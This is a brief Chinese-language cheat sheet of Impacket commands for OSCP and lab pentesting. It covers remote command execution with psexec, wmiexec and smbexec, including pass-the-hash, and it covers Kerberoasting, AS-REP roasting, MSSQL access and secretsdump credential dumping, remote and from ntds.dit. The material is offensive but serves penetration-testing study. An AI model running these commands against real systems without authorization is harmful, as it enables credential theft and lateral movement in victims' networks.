# Impacket 常用工具

这篇记录 Impacket 里常用脚本的基础用法。OSCP 和内网实验里经常会用它处理 SMB、Kerberos、MSSQL、远程服务和凭据验证。

## SMB 和远程命令

psexec 风格连接。

```bash
impacket-psexec DOMAIN/USER:'PASSWORD'@192.168.1.10
```

wmiexec 风格连接。

```bash
impacket-wmiexec DOMAIN/USER:'PASSWORD'@192.168.1.10
```

smbexec 风格连接。

```bash
impacket-smbexec DOMAIN/USER:'PASSWORD'@192.168.1.10
```

使用 hash 连接。

```bash
impacket-wmiexec -hashes :NTLM_HASH DOMAIN/USER@192.168.1.10
```

## SMB 服务和文件

启动临时 SMB 服务。

```bash
impacket-smbserver share . -smb2support
```

带账号启动 SMB 服务。

```bash
impacket-smbserver share . -smb2support -username USER -password PASSWORD
```

列远程共享。

```bash
impacket-smbclient DOMAIN/USER:'PASSWORD'@192.168.1.10
```

## Kerberos

请求 TGT。

```bash
impacket-getTGT DOMAIN/USER:'PASSWORD'
```

使用 hash 请求 TGT。

```bash
impacket-getTGT DOMAIN/USER -hashes :NTLM_HASH
```

请求服务票据。

```bash
impacket-GetUserSPNs DOMAIN/USER:'PASSWORD' -dc-ip 192.168.1.10 -request
```

AS-REP roast 检查。

```bash
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -dc-ip 192.168.1.10 -no-pass
```

## MSSQL

连接 MSSQL。

```bash
impacket-mssqlclient DOMAIN/USER:'PASSWORD'@192.168.1.10
```

使用 Windows 认证连接 MSSQL。

```bash
impacket-mssqlclient DOMAIN/USER:'PASSWORD'@192.168.1.10 -windows-auth
```

## 凭据转储相关

远程 secretsdump。

```bash
impacket-secretsdump DOMAIN/USER:'PASSWORD'@192.168.1.10
```

离线读取 ntds.dit。

```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

## 备注

Impacket 工具很多，命令格式通常是 `DOMAIN/USER:PASSWORD@TARGET`。涉及 Kerberos 时要注意域名、时间同步、DNS 和 KRB5CCNAME 环境变量。
